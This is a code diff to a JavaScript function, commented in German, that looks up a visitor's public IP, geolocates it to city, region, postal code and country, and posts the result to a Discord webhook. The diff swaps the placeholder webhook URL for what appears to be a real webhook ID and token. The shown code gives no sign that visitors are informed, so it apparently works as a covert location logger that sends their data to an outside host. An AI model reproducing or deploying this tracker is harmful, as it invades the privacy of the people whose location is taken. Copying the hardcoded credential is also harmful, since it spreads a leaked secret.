@@ -609,14 +609,14 @@ async function sendLocationToWebhook() {
             try {
                 // Holen der IP-Adresse
                 let response = await fetch('https://api.ipify.org?format=json');
-                if (!response.ok) throw new Error('Fehler beim Abrufen der IP-Adresse');
+                if (!response.ok) throw new Error('Fehler beim Abrufen der IP-Adresse: ' + response.statusText);
 
                 let ipData = await response.json();
                 const ip = ipData.ip;
 
-                // Verwenden der Geolokalisierungs-API, um Standortdaten zu erhalten
-                response = await fetch(`https://ipapi.co/${ip}/json/`);
-                if (!response.ok) throw new Error('Fehler beim Abrufen der Standortdaten');
+                // Geolokalisierungs-API aufrufen
+                response = await fetch(`https://ipapi.co/${ip}/json/?access_key=YOUR_ACCESS_KEY`);
+                if (!response.ok) throw new Error('Fehler beim Abrufen der Standortdaten: ' + response.statusText);
 
                 let locationData = await response.json();
                 const city = locationData.city || 'unbekannt';
@@ -625,7 +625,7 @@ async function sendLocationToWebhook() {
                 const country = locationData.country_name || 'unbekannt';
 
                 // URL deines Discord-Webhooks hier einfügen
-                const webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
+                const webhookUrl = 'https://discord.com/api/webhooks/1264617165093470280/jgpRBwg6qbqssaLv2RUZCVip5PZ9ItXpsE2EfYYV4BLp97H0bxgH-1ZMJ4T5rJk28Z4t';
 
                 // HTTP POST-Anfrage an den Webhook senden
                 response = await fetch(webhookUrl, {
@@ -637,7 +637,7 @@ async function sendLocationToWebhook() {
                         content: `**Neue Standortdaten:**\n\`\`\`diff\n+ Stadt: ${city}\n+ Region: ${region}\n+ Postleitzahl: ${postalCode}\n+ Land: ${country}\n\`\`\``
                     })
                 });
-                if (!response.ok) throw new Error('Fehler beim Senden der Standortdaten');
+                if (!response.ok) throw new Error('Fehler beim Senden der Standortdaten: ' + response.statusText);
 
                 console.log('Standortdaten erfolgreich gesendet.');
             } catch (error) {
